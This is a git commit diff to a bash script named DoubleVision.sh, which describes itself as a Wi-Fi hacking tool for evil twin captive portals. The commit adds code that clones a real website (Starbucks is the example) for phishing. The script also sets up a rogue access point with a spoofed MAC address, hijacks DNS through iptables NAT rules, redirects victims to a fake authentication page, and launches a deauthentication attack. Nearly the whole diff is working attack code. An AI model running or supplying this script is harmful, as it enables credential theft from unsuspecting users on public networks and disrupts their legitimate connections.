9b6fbcf8bed04333f70f07e6ff2b3c56b94cbd82
assume-breach <76174163+assume-breach@users.noreply.github.com>
2022-05-18 10:44:31 -0400

    Update DoubleVision.sh

--- DoubleVision/DoubleVision.sh
+++ DoubleVision/DoubleVision.sh
@@ -1,5 +1,27 @@
 #!/bin/bash
+cat << "EOF"
+  __ _ ___ ___ _   _ _ __ ___   ___      | |__  _ __ ___  __ _  ___| |__  
+ / _` / __/ __| | | | '_ ` _ \ / _ \_____| '_ \| '__/ _ \/ _` |/ __| '_ \ 
+| (_| \__ \__ \ |_| | | | | | |  __/_____| |_) | | |  __/ (_| | (__| | | |
+ \__,_|___/___/\__,_|_| |_| |_|\___|     |_.__/|_|  \___|\__,_|\___|_| |_|
 
+                            **Double Vision**
+
+             A Wifi Hacking Tool For Evil Twin Captive Portals
+
+                           Use At Your Own Risk
+
+
+ 
+EOF
+echo ""
+echo "Enter Website URL To Clone. Example: https://starbucks.com"
+echo ""
+read URL
+echo ""
+rm /var/www/html/index.html
+runuser -u pi -- ./SingleFile/cli/single-file $URL --browser-executable-path=/usr/bin/chromium-browser /home/pi/index.html 
+mv /home/pi/index.html /var/www/html/index.html
 service apache2 start
 sleep 1
 ifconfig wlan2 down
@@ -7,13 +29,14 @@ macchanger -A wlan2
 sleep 1 
 ifconfig wlan2 up
 sleep 1
+systemctl start dnsmasq
 hostapd -B /etc/hostapd/hostapd.conf
 sleep 2
 ifconfig br0 up
 sleep 2
 ifconfig br0 10.1.1.1 netmask 255.255.255.0
 sysctl net.ipv4.ip_forward=1
-echo "<meta http-equiv="refresh" content=3;URL='http://10.1.1.1/authenticate.html'>">> /var/www/html/index.html
+echo "<meta http-equiv="refresh" content=2;URL='http://10.1.1.1/authenticate.html'>">> /var/www/html/index.html
 iptables --flush
 iptables -t nat --flush
 iptables -t nat -A PREROUTING -i br0 -p udp -m udp --dport 53 -j DNAT --to-destination 10.1.1.1:53
@@ -28,6 +51,5 @@ echo ""
 sleep 2
 echo "Press CTRL+B then press D to disconnect TMUX Session Once Deauth Is Started"
 echo ""
-tmux new -s deauth 'cd PwrDeauther &&  bash PwrDeauther.sh'
-
+tmux new-session -s deauth 'cd PwrDeauther &&  bash PwrDeauther.sh'
 
